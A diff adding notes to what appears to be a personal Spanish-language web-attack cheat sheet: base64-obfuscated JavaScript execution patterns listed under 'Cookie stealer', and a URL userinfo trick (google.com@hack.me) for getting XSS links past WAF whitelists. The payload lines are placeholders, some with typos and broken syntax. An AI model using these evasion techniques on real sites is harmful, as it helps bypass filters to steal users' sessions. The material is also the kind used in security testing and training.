@@ -48,5 +48,26 @@ UNION ALL SELECT
 augh.php
 
 
+################################Base64 evasion
+
+####Cookie stealer
+eval(atob("base64 full payload"))
+[].constructor.constructor("codigo en base64")()
+setTiemout(atob("code base64"()
+setInterval(atob("code base64"))
+setImmediate(atob("code base64))
+Function(atob("code base64"))()
 
 
+###############################URI ofuscation
+URI=Uniform Resource Identifier.
+###URI shortening:
+http://yourls.org/
+
+URL AUTHORITY OBFUSCATION:
+Podemos pasar filtros simulando un envío de credenciales(userinfo) a una página que no utiliza autenticación ej:
+https://www.google.com@hack.me/t/xss
+Usamos el espacio de credenciales para pasar una página que se encuentra en el whitelist con el fin de que al leerla el WAF o filtro la deje
+pasar, llevándonos a hack.me que, al no requerir credenciales, ignora la primer parte.
+
+Podemos también agregar caracteres UNICODE en el userinfo ya que en este segmento de la URL son aceptados.
